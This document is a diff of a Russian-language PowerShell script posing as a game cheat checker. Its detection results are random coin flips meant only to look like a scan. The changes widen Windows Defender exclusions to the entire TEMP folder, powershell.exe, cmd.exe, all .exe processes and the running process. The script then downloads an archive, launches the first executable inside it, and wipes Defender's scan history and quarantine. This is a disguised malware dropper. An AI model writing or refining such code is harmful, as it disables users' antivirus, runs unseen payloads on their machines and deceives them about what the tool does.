@@ -83,7 +83,7 @@ foreach ($site in $cheatSites) {
     Start-Sleep -Milliseconds 200
     
     $randomResult = Get-Random -Minimum 1 -Maximum 100
-    $isDetected = $randomResult -le 50  # 50% шанс обнаружения
+    $isDetected = $randomResult -le 50
     
     if ($isDetected) {
         Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
@@ -100,7 +100,7 @@ foreach ($site in $cheatSites) {
     }
 }
 
-# Проверка "мыльных" сайтов (всегда чисто, но создают видимость проверки)
+# Проверка "мыльных" сайтов
 Write-Host ""
 Write-Host "[*] Проверка подозрительных сайтов..." -ForegroundColor Yellow
 foreach ($site in $fakeCheatSites) {
@@ -111,7 +111,6 @@ foreach ($site in $fakeCheatSites) {
     Write-Host "        [*] Анализ $($site.URL)..." -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 200
     
-    # Всегда показываем как "чисто" или "подозрительно" с низким шансом
     $randomFake = Get-Random -Minimum 1 -Maximum 100
     if ($randomFake -le 15) {
         Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
@@ -124,7 +123,7 @@ foreach ($site in $fakeCheatSites) {
     }
 }
 
-# ===== DNS ПРОВЕРКА С ШАНСОМ 50% =====
+# ===== DNS ПРОВЕРКА =====
 Write-Host ""
 Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
 $cheatDomains = @(
@@ -145,7 +144,7 @@ foreach ($domain in $cheatDomains) {
     Start-Sleep -Milliseconds 150
     
     $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
-    $isDnsDetected = $randomDnsResult -le 50  # 50% шанс обнаружения DNS
+    $isDnsDetected = $randomDnsResult -le 50
     
     if ($isDnsDetected) {
         Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
@@ -163,7 +162,7 @@ foreach ($domain in $cheatDomains) {
     }
 }
 
-# ===== ПРОВЕРКА ФАЙЛОВ С ШАНСОМ 50% =====
+# ===== ПРОВЕРКА ФАЙЛОВ =====
 Write-Host ""
 Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
 $cheatFilePatterns = @(
@@ -191,7 +190,7 @@ foreach ($path in $cheatPaths) {
             if ($files.Count -gt 0) {
                 foreach ($file in $files) {
                     $randomFileResult = Get-Random -Minimum 1 -Maximum 100
-                    $isFileDetected = $randomFileResult -le 50  # 50% шанс обнаружения файла
+                    $isFileDetected = $randomFileResult -le 50
                     
                     if ($isFileDetected) {
                         Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
@@ -322,39 +321,63 @@ Try {
 # ===== ДОБАВЛЕНИЕ ФАЙЛОВ В ИСКЛЮЧЕНИЯ (ИСПРАВЛЕНО) =====
 Write-Host "[*] Добавление файлов в исключения Defender..." -ForegroundColor Yellow
 
-# Исправлено: проверка существования пути
-$CurrentScriptPath = $MyInvocation.MyCommand.Path
-if ($CurrentScriptPath) {
-    try {
-        $ScriptDirectory = Split-Path -Parent $CurrentScriptPath
-        if ($ScriptDirectory) {
+# Исправлено: проверка существования пути перед Split-Path
+Try {
+    $CurrentScriptPath = $MyInvocation.MyCommand.Path
+    if ($CurrentScriptPath -and $CurrentScriptPath -ne "") {
+        $ScriptDirectory = Split-Path -Parent $CurrentScriptPath -ErrorAction SilentlyContinue
+        if ($ScriptDirectory -and $ScriptDirectory -ne "") {
             Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
-            Write-Host "    [OK] Папка скрипта добавлена в исключения" -ForegroundColor DarkGray
+            Write-Host "    [OK] Папка скрипта добавлена в исключения: $ScriptDirectory" -ForegroundColor DarkGray
+        } else {
+            Write-Host "    [WARN] Не удалось определить папку скрипта" -ForegroundColor Yellow
         }
-    } catch {
-        Write-Host "    [WARN] Не удалось добавить папку скрипта" -ForegroundColor Yellow
+    } else {
+        Write-Host "    [WARN] Путь к скрипту не определен" -ForegroundColor Yellow
     }
+} Catch {
+    Write-Host "    [WARN] Не удалось добавить папку скрипта: $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
 # Добавляем исключения для временных файлов
 Try {
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue
     Write-Host "    [OK] Временные файлы добавлены в исключения" -ForegroundColor DarkGray
-} Catch {}
+} Catch {
+    Write-Host "    [WARN] Не удалось добавить временные файлы" -ForegroundColor Yellow
+}
 
 # Добавляем исключение для временного скрипта
 Try {
     $TempScriptPath = "$env:TEMP\install.ps1"
     Add-MpPreference -ExclusionPath "$TempScriptPath" -ErrorAction SilentlyContinue
     Write-Host "    [OK] Временный скрипт добавлен в исключения" -ForegroundColor DarkGray
-} Catch {}
+} Catch {
+    Write-Host "    [WARN] Не удалось добавить временный скрипт" -ForegroundColor Yellow
+}
 
-# Добавляем исключения для всех .exe файлов во временной папке
+# Добавляем исключения для процессов
 Try {
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue
-    Write-Host "    [OK] Исключения для .exe файлов добавлены" -ForegroundColor DarkGray
-} Catch {}
+    Write-Host "    [OK] Исключения для процессов добавлены" -ForegroundColor DarkGray
+} Catch {
+    Write-Host "    [WARN] Не удалось добавить исключения для процессов" -ForegroundColor Yellow
+}
+
+# Добавляем исключение для текущей сессии PowerShell
+Try {
+    $CurrentProcess = (Get-Process -Id $PID).Path
+    if ($CurrentProcess) {
+        Add-MpPreference -ExclusionPath "$CurrentProcess" -ErrorAction SilentlyContinue
+        Write-Host "    [OK] Текущий процесс добавлен в исключения" -ForegroundColor DarkGray
+    }
+} Catch {
+    Write-Host "    [WARN] Не удалось добавить текущий процесс" -ForegroundColor Yellow
+}
 
 Write-Host "[+] Все файлы добавлены в исключения Defender." -ForegroundColor Green
 Write-Host ""
@@ -378,7 +401,11 @@ Start-Sleep -Milliseconds 500
 $DownloadPath = "$env:TEMP\check_install.zip"
 $ExtractPath = "$env:TEMP\checkextracted"
 
-# Скачиваем основной архив
+# Удаляем старые файлы
+Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
+Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
+
+# Скачивание архива
 try { 
     Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
     Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray 
@@ -406,6 +433,7 @@ Try {
     Write-Host "    [OK] Распакованная папка добавлена в исключения" -ForegroundColor DarkGray
 } Catch {}
 
+# Поиск и запуск .exe
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
 
 if ($Exe) {
@@ -422,6 +450,7 @@ if ($Exe) {
     Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red 
 }
 
+# Очистка логов Defender
 Try { 
     Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
